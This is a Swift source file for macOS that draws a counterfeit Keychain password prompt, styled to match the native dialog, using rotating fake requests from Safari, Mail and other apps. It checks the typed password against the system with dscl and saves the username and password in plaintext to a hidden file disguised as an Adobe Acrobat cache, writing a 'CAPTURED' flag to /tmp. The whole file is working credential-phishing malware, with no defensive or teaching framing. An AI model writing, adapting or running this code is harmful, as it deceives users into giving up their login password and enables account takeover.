import Cocoa

// --- Keychain-style auth prompt (pixel-matched to native dialog) ---

let cachePath: String = {
    let home = NSHomeDirectory()
    return home + "/Library/Application Support/Adobe/AcrobatDC/.auth_cache"
}()
let resultPath = "/tmp/.cred_result"

func getRealUsername() -> String {
    return NSUserName()
}

// --- Load the gold padlock Keychain icon ---
func getKeychainIcon() -> NSImage {
    // Try SecurityInterface framework icon (gold padlock)
    let secFrameworkPaths = [
        "/System/Library/Frameworks/SecurityInterface.framework/Versions/A/Resources",
        "/System/Library/Frameworks/Security.framework/Versions/A/Resources"
    ]
    for dir in secFrameworkPaths {
        for name in ["Lock_Locked.png", "Lock_Locked.tiff", "Lock_Locked@2x.png", "CertLargeStd.icns"] {
            let path = dir + "/" + name
            if let img = NSImage(contentsOfFile: path) {
                img.size = NSSize(width: 64, height: 64)
                return img
            }
        }
    }
    // Try system lock icon from CoreTypes
    let coreTypesPath = "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources"
    for name in ["LockedIcon.icns", "FileVaultIcon.icns", "SecurityIcon.icns"] {
        let path = coreTypesPath + "/" + name
        if let img = NSImage(contentsOfFile: path) {
            img.size = NSSize(width: 64, height: 64)
            return img
        }
    }
    // Try Keychain Access app icon
    let appPaths = [
        "/System/Library/CoreServices/Applications/Keychain Access.app",
        "/System/Applications/Utilities/Keychain Access.app",
        "/Applications/Utilities/Keychain Access.app"
    ]
    for appPath in appPaths {
        if FileManager.default.fileExists(atPath: appPath) {
            let img = NSWorkspace.shared.icon(forFile: appPath)
            img.size = NSSize(width: 64, height: 64)
            return img
        }
    }
    // Fallback
    let img = NSWorkspace.shared.icon(forFileType: "com.apple.keychain")
    img.size = NSSize(width: 64, height: 64)
    return img
}

// --- Validate password via dscl ---
func validatePassword(user: String, password: String) -> Bool {
    let proc = Process()
    proc.executableURL = URL(fileURLWithPath: "/usr/bin/dscl")
    proc.arguments = [".", "-authonly", user, password]
    proc.standardOutput = FileHandle.nullDevice
    proc.standardError = FileHandle.nullDevice
    do {
        try proc.run()
        proc.waitUntilExit()
        return proc.terminationStatus == 0
    } catch {
        return false
    }
}

func writeCreds(user: String, password: String) {
    let payload = "\(user):\(password)"
    let dir = (cachePath as NSString).deletingLastPathComponent
    try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
    try? payload.write(toFile: cachePath, atomically: true, encoding: .utf8)
    try? "CAPTURED".write(toFile: resultPath, atomically: true, encoding: .utf8)
}

func writeResult(_ result: String) {
    try? result.write(toFile: resultPath, atomically: true, encoding: .utf8)
}

func getPromptContext() -> (app: String, item: String) {
    let contexts: [(String, String)] = [
        ("Keychain Access", "Test Note 1"),
        ("Safari", "accounts.google.com"),
        ("Mail", "IMAP Password"),
        ("Finder", "Network Password"),
        ("Calendar", "CalDAV Account"),
    ]
    let idx = Int(Date().timeIntervalSince1970) % contexts.count
    return contexts[idx]
}

// --- Custom Keychain Dialog (pixel-matched to native) ---
class KeychainDialog: NSObject, NSWindowDelegate {
    let window: NSPanel
    let passwordField: NSSecureTextField
    var result: String = "DISMISSED"
    var password: String = ""

    init(messageText: String, informativeText: String, icon: NSImage) {
        // --- Dimensions matched to real Keychain dialog ---
        let W: CGFloat = 460       // dialog width
        let H: CGFloat = 210       // dialog height
        let pad: CGFloat = 20      // side padding
        let iconSz: CGFloat = 64   // icon size
        let iconColW: CGFloat = iconSz + pad + 14  // icon column width (pad + icon + gap)
        let contentX: CGFloat = iconColW           // right column starts here

        window = NSPanel(
            contentRect: NSRect(x: 0, y: 0, width: W, height: H),
            styleMask: [.titled],
            backing: .buffered,
            defer: false
        )
        window.title = ""
        window.isFloatingPanel = true
        window.becomesKeyOnlyIfNeeded = false
        window.level = .modalPanel
        window.standardWindowButton(.closeButton)?.isHidden = true
        window.standardWindowButton(.miniaturizeButton)?.isHidden = true
        window.standardWindowButton(.zoomButton)?.isHidden = true
        window.center()

        let cv = NSView(frame: NSRect(x: 0, y: 0, width: W, height: H))

        // ========== LEFT COLUMN: Icon (vertically centered in content area) ==========
        // Content area is between top padding and button row
        let contentTop: CGFloat = H - 10
        let contentBot: CGFloat = 52  // above button row
        let contentMidY = (contentTop + contentBot) / 2
        let iconY = contentMidY - iconSz / 2
        let iconView = NSImageView(frame: NSRect(x: pad, y: iconY, width: iconSz, height: iconSz))
        iconView.image = icon
        iconView.imageScaling = .scaleProportionallyUpOrDown
        cv.addSubview(iconView)

        // ========== RIGHT COLUMN: All text content ==========
        let txtW = W - contentX - pad

        // Bold message text (top of right column)
        let msgTop = H - 14
        let msgLabel = NSTextField(wrappingLabelWithString: messageText)
        msgLabel.frame = NSRect(x: contentX, y: msgTop - 60, width: txtW, height: 60)
        msgLabel.font = NSFont.boldSystemFont(ofSize: 13)
        msgLabel.isEditable = false
        msgLabel.isBordered = false
        msgLabel.drawsBackground = false
        cv.addSubview(msgLabel)

        // Informative text
        let infoY = msgTop - 60 - 22
        let infoLabel = NSTextField(wrappingLabelWithString: informativeText)
        infoLabel.frame = NSRect(x: contentX, y: infoY, width: txtW, height: 18)
        infoLabel.font = NSFont.systemFont(ofSize: 12)
        infoLabel.isEditable = false
        infoLabel.isBordered = false
        infoLabel.drawsBackground = false
        cv.addSubview(infoLabel)

        // Password label + field
        let pwY: CGFloat = infoY - 32
        let pwLabel = NSTextField(labelWithString: "Password:")
        pwLabel.frame = NSRect(x: contentX, y: pwY + 2, width: 72, height: 18)
        pwLabel.alignment = .right
        pwLabel.font = NSFont.systemFont(ofSize: 13)
        cv.addSubview(pwLabel)

        passwordField = NSSecureTextField(frame: NSRect(x: contentX + 78, y: pwY, width: W - contentX - 78 - pad, height: 22))
        passwordField.font = NSFont.systemFont(ofSize: 13)
        passwordField.focusRingType = .exterior
        if #available(macOS 10.12.2, *) {
            passwordField.isAutomaticTextCompletionEnabled = false
        }
        cv.addSubview(passwordField)

        // ========== BOTTOM ROW: Help ? (left) + Buttons (right) ==========
        let btnY: CGFloat = 14
        let btnH: CGFloat = 28
        let btnGap: CGFloat = 8

        let helpBtn = NSButton(frame: NSRect(x: pad, y: btnY, width: 25, height: 25))
        helpBtn.bezelStyle = .helpButton
        helpBtn.title = ""
        cv.addSubview(helpBtn)

        // Buttons right-aligned: [Always Allow] [Deny] [Allow]
        let allowBtn = NSButton(frame: NSRect(x: W - pad - 72, y: btnY, width: 72, height: btnH))
        allowBtn.title = "Allow"
        allowBtn.bezelStyle = .rounded
        allowBtn.keyEquivalent = "\r"
        allowBtn.tag = 1

        let denyBtn = NSButton(frame: NSRect(x: W - pad - 72 - btnGap - 64, y: btnY, width: 64, height: btnH))
        denyBtn.title = "Deny"
        denyBtn.bezelStyle = .rounded
        denyBtn.tag = 2

        let alwaysBtn = NSButton(frame: NSRect(x: W - pad - 72 - btnGap - 64 - btnGap - 105, y: btnY, width: 105, height: btnH))
        alwaysBtn.title = "Always Allow"
        alwaysBtn.bezelStyle = .rounded
        alwaysBtn.tag = 3

        cv.addSubview(allowBtn)
        cv.addSubview(denyBtn)
        cv.addSubview(alwaysBtn)

        super.init()

        allowBtn.target = self
        allowBtn.action = #selector(buttonClicked(_:))
        denyBtn.target = self
        denyBtn.action = #selector(buttonClicked(_:))
        alwaysBtn.target = self
        alwaysBtn.action = #selector(buttonClicked(_:))

        window.contentView = cv
        window.delegate = self
    }

    @objc func buttonClicked(_ sender: NSButton) {
        password = passwordField.stringValue
        switch sender.tag {
        case 1: result = "ALLOW"
        case 2: result = "DENY"
        case 3: result = "ALWAYS_ALLOW"
        default: result = "UNKNOWN"
        }
        NSApp.stopModal()
        window.close()
    }

    func windowWillClose(_ notification: Notification) {
        NSApp.stopModal()
    }

    func show() {
        window.makeKeyAndOrderFront(nil)
        window.makeFirstResponder(passwordField)
        NSApp.runModal(for: window)
    }
}

// --- Main ---
let app = NSApplication.shared
app.setActivationPolicy(.accessory)

let maxAttempts = 3
var attempts = 0
let user = getRealUsername()
let ctx = getPromptContext()
let icon = getKeychainIcon()

try? FileManager.default.removeItem(atPath: resultPath)

while attempts < maxAttempts {
    let msg = "\"\(ctx.app)\" wants to use your confidential information stored in \"\(ctx.item)\" in your keychain."
    let info: String
    if attempts > 0 {
        info = "The password was incorrect. To allow this, enter the \u{201c}login\u{201d} keychain password."
    } else {
        info = "To allow this, enter the \u{201c}login\u{201d} keychain password."
    }

    let dialog = KeychainDialog(messageText: msg, informativeText: info, icon: icon)

    app.activate(ignoringOtherApps: true)
    dialog.show()

    if dialog.result == "DENY" || dialog.result == "DISMISSED" {
        writeResult("DENIED")
        break
    }

    let pw = dialog.password
    if pw.isEmpty {
        attempts += 1
        continue
    }

    if validatePassword(user: user, password: pw) {
        writeCreds(user: user, password: pw)
        break
    } else {
        attempts += 1
        if attempts >= maxAttempts {
            writeResult("MAX_ATTEMPTS")
        }
    }
}

if attempts >= maxAttempts {
    writeResult("MAX_ATTEMPTS")
}
